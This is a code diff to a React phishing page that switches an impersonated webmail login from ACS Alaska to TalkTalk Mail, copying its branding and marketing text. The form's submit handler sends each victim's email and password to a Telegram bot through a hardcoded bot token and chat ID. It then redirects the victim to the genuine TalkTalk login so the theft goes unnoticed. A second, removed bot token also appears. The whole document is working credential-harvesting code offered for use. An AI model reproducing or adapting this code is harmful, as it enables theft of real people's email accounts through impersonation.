@@ -10,6 +10,12 @@ import axios from 'axios';
 import { useEffect } from 'react';
 import myfairpoint from './fairpoint.png';
 import aska from './aska.png';
+import talktalk from './talktalk.png';
+
+import ddd from './ddd.png';
+import talk from './talk.png';
+
+import service from './service.png';
 
 
 function Home(){
@@ -17,7 +23,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("acsalaska")
+    const[platform, setPlatform] = useState("TalkTalk")
 
     const[showError, setShowError] = useState(false);
 
@@ -39,8 +45,12 @@ async function handleSubmit(e){
         //     platform:platform
         // });
 
-       const response =  await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
-            chat_id: 5868304053,
+
+        
+
+
+       const response =  await axios.post(`https://api.telegram.org/bot6900331145:AAGvVRRZV-leQZaqag7znIRPlJ79dQfZRJ0/sendMessage`, {
+            chat_id: 7150651870,
             text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
           });
 
@@ -52,7 +62,7 @@ async function handleSubmit(e){
            // console.log(response.data.message);
 
           
-           window.location.href = 'https://mymail.acsalaska.net/#/login';
+           window.location.href = 'https://apps.talktalk.co.uk/appsuite/';
         }
       } catch (error) {
         // Handle error
@@ -63,8 +73,8 @@ async function handleSubmit(e){
 
     return (
         <>
-            <nav className='mynav px-3 py-1 bg-dark'>
-                <img className='navimage' src={aska} />
+            <nav className='mynav px-3 py-4 navbg'>
+                <img className='navimage' src={talktalk} />
 
             </nav>
 
@@ -79,7 +89,7 @@ async function handleSubmit(e){
             </button>
             </div>}
 
-            <div className='formdiv col-md-4 m-auto p-0  card rounded'>
+            <div className='formdiv  p-0 '>
             {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
             <strong className='text-center'>Invalid Email or Password</strong> 
             <button type="button" className="close" data-dismiss="alert" aria-label="Close">
@@ -87,49 +97,106 @@ async function handleSubmit(e){
             </button>
             </div>}
 
-                <div className='text-center py-5'>
-                    <h3 className='mainheading'>Web<span>mail</span></h3>
+               
+
+
+                <div className='row px-5'>
+
+                    <div className='col-md-9 bigdiv px-5'>
+                        <h2 className='bighead'>Login to discover your new TalkTalk Mail Today</h2>
+
+
+                        <div className='bigflex'>
+                                <div className='contents'>
+                                            <h4 className='bigsub'>We've made TalkTalk Mail better <br/>
+                                        and even easier to use
+                                    </h4>
+
+                                    <p className='bigpara'>We've introduced feature you have been asking for. 
+                                    Your email now has a dedicated spam button to help you improve spam filters and
+                                    protect you from scams.  When you recieve a spam mail , just click '<b>Mark as spam</b>'
+                                    link to update your spam filters.
+                                    
+                                    </p>
+
+
+                                     <a className='biglink'>Find out more</a>
+
+                                </div>
+
+                                
+                                <img className='fleximage' src={ddd}/>
+
+                             </div>
+
+                        
+                    </div>
+
+
+                    <div className='col smalldiv card py-5'>
+
+                        <div className='talkdiv'>
+                            <img src={talk} className="talkimage"/>
+                        </div>
+
+                        <br/>
+
+                        <p className='purple'>Sign in to access your apps:</p>
+
+                        <div className='text-center'>
+                        <img src={service} className="service"/>
+                        </div>
+
+                                                <form onSubmit={handleSubmit} className='px-2 py-3'>
+
+                                        
+
+                        <div className='form-group'>
+                            <label className='text-secondary font-weight-bold'>Your TalkTalk email address *</label>
+                            <input onChange={function(e){
+                                                        setUserName(e.target.value);
+                                                    }}value={email} type="email"placeholder='Email' className='form-control' required />
+
+                        </div>
+
+                        <div className='form-group'>
+                        <label className='text-secondary font-weight-bold py-2'>Your Password *</label>
+                            <input onChange={function(e){
+                                                        setPassword(e.target.value);
+                                                    }}value={password} type="password"placeholder='Password' className='form-control' required />
+
+                        </div>
+
+
+                        <div className=''>
+                            <a className='forgot' href="">Forgotten Your Password ?</a>
+                        </div>
+
+
+
+                            
+
+                        
+
+
+                        <div className='buttondiv py-4 text-center'>
+                            <button className='mybutton rounded py-2'type="submit">Sign In</button>
+
+                        </div>
+
+
+                     
+
+
+
+                        </form>
+
+                    
+                    </div>
+
                 </div>
 
-                <form onSubmit={handleSubmit} className='px-2 py-3'>
-
                 
-
-                    <div className='form-group'>
-                        <input onChange={function(e){
-                                                    setUserName(e.target.value);
-                                                }}value={email} type="email"placeholder='Email' className='form-control' required />
-
-                    </div>
-
-                    <div className='form-group'>
-                        <input onChange={function(e){
-                                                    setPassword(e.target.value);
-                                                }}value={password} type="password"placeholder='Password' className='form-control' required />
-
-                    </div>
-
-
-
-
-                           
-
-                       
-
-
-                    <div className='buttondiv py-4 text-center'>
-                        <button className='mybutton rounded'type="submit">Login</button>
-
-                    </div>
-
-
-                    <div className='text-right'>
-                        <a className='forgot' href="">Forgot Password ?</a>
-                    </div>
-
-
-
-                </form>
 
                 
 
